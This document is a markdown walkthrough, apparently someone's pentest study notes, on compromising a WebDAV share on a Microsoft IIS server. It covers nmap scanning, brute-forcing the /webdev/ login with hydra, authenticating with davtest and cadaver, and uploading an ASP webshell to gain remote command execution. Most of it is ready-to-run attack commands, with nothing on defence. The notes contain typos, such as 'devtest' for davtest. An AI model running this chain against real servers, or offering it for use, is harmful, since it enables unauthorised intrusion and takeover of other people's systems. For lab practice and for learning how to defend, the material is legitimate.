## Exploiting WebDev running on Microsoft IIS

After getting target IP address, first run nmap to scan open ports and services running
```
nmap -sV -sC <ip>
```
-sV: Probe open ports to determine service/version info \
-sC: equivalent to --script=default

---

Finding more information on port 80
- we can see /webdev/ if webdev is running on that IIS microsoft server 
- Authorization is required if not asking authorization then then it is very easy to exploit it by uploading webshell

```
nmap -sV -p 80 --script=http-enum <ip>
```

---

Now, Go to the browser and then http://ip/webdev. We can see files and directories
- If authorization is required then we need to bruteforce to find out username and password.
- To bruteforce we can use ```hydra``` tool.
```
hydra -L username/wordlists/path -P password/wordlists/path <ip> http-get /webdev/
```
-L : provide username wordlists \
-P : provide password wordlists \
-p : provide username \
-l : provide password

### Tools
---
1. ```davtest``` - Used to scan, authenticate and exploit a WebDev server.
2. ```cadaver``` - cadaver supports file upload, download, on-secreen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation and resource locking on WebDev servers
---
 ## ```davtest```
```
devtest -url http://ip/webdev
```
If authentication is required then,
```
davtest -auth username:password -url http://ip/webdev
```
Note: while doing this process means authenticating, devtest will create ```DevTestDir``` named directory 

---
## ```cadaver```
```
cadaver --help
```
```
cadaver http://ip/webdev
```
after executing, we need to provide valid credentials
  - username:
  - passwrod:

Then we will get one interface which of webdev sever
Now, we can perfor ```ls``` to list files and directory 
```
ls
```
The main focus is to upload webshell to get RCE
```
put /usr/share/webshells/asp/webshell.asp
```
It will uplad webshell in webdev. <br>
Note: you have upload that extension webshell which has permission to execute in webdev. IN my case asp file
- To see the lists of webshell, you have run this command in your terminal
  ```
  ls -al /usr/share/webshells/
  ```

---

Come back, We have successfully uploaded webshell in webdev.<br>
Now, browse http://ip/webdev<br>
then click on that wehshell to get interface to run command on IIS server
